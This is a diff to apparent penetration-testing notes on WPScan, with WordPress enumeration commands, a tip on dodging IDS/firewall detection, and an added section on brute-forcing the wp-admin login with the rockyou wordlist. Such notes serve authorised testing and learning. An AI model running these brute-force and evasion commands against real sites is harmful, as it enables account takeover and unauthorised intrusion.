@@ -1,4 +1,5 @@
 # WPScan
+WPScan: https://github.com/wpscanteam/wpscan
 Other tools like WPScan: https://github.com/iniqua/plecost
 
 ## Updating WPScan
@@ -15,4 +16,12 @@ Avoid risking being caught by IDS / firewall use `--uger-agent` and well know on
 ```bash
 wpscan --url http://<target>
 target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
+```
+
+## Bruteforce wp-admin login page
+
+```bash
+wpscan --url http://<target-wp> --wordlist /usr/share/wordlist/rockyou.txt --username admin
+## You can leave out --username. Then it will first enumerate all usernames and then begin bruteforce
+wpscan --url http://<target-wp> --wordlist /usr/share/wordlist/rockyou.txt
 ```
